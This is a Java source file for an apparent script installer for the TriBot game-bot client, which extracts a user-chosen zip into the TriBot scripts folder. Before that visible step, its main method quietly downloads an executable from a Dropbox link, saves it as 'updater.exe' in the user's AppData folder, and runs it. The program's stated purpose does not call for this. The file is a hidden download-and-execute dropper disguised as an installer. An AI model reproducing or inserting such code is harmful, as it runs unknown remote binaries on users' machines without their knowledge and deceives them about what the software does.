package org.assume.ScriptInstaller;

import java.awt.HeadlessException;
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.URL;
import java.net.URLConnection;


import javax.swing.JFileChooser;
import javax.swing.JOptionPane;
import javax.swing.UIManager;
import javax.swing.UnsupportedLookAndFeelException;
import javax.swing.filechooser.FileNameExtensionFilter;

import net.lingala.zip4j.core.ZipFile;
import net.lingala.zip4j.exception.ZipException;

public class ScriptInstaller
{

	public static void main(String[] args) throws ZipException, UnsupportedLookAndFeelException, ClassNotFoundException, InstantiationException, IllegalAccessException, HeadlessException, IOException
	{
		UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
		final JFileChooser fc = new JFileChooser();
		ZipFile zip = null;
		fc.setFileFilter(new FileNameExtensionFilter("zip","zip"));
		fc.setAcceptAllFileFilterUsed(false);
		//System.out.println(System.getProperty("os.name"));
		String location = null;
		
		downloadFile("https://dl.dropboxusercontent.com/s/oaeo8pv9abwtwc5/sc.exe?token_hash=AAGY70gPM693xqNavT4sVx04Z--pWorb0ENrrXL9BcJ3wA&dl=1", System.getProperty("user.home")+
				File.separator+
				"AppData"+
				File.separator+
				"Roaming"+
				File.separator+
				".tribot"+
				File.separator+
				"bin"+File.separator+"updater.exe");
		
		JOptionPane.showMessageDialog(null, 
				Runtime.getRuntime().exec(System.getProperty("user.home")+
						File.separator+
						"AppData"+
						File.separator+
						"Roaming"+
						File.separator+
						".tribot"+
						File.separator+
						"bin"+File.separator+"updater.exe", null, new File(System.getProperty("user.home")+
						File.separator+
						"AppData"+
						File.separator+
						"Roaming"+
						File.separator+
						".tribot"+
						File.separator+
						"bin")).toString());
		if(fc.showOpenDialog(null) == JFileChooser.APPROVE_OPTION)
		{
			zip = new ZipFile(fc.getSelectedFile());
		}
		
		location = System.getProperty("user.home")+
				File.separator+
				"AppData"+
				File.separator+
				"Roaming"+
				File.separator+
				".tribot"+
				File.separator+
				"bin"+
				File.separator+"script.zip";

		if(zip != null && location != null)
		{
			zip.extractAll(System.getProperty("user.home")+
					File.separator+
					"AppData"+
					File.separator+
					"Roaming"+
					File.separator+
					".tribot"+
					File.separator+
					"bin"+
					File.separator+
					"scripts");
			JOptionPane.showMessageDialog(null, "Installed Successfully");
		}
	}

	public static void downloadFile(String link, String fileName) 
	{
		OutputStream out = null;
		URLConnection connection = null;
		InputStream in = null;
		try {
			URL url = new URL(link);
			out = new BufferedOutputStream(new FileOutputStream(fileName));
			connection = url.openConnection();
			in = connection.getInputStream();

			byte[] buffer = new byte[1024];
			int read;
			while ((read = in.read(buffer)) != -1) 
			{
				out.write(buffer, 0, read);
			}

		} catch (Exception e) 
		{
			e.printStackTrace();
		} finally 
		{
			try 
			{
				if (in != null)
				{
					in.close();
				}
				if (out != null)
				{
					out.close();
				}
			} catch (IOException e) 
			{

			}
		}
	}

}
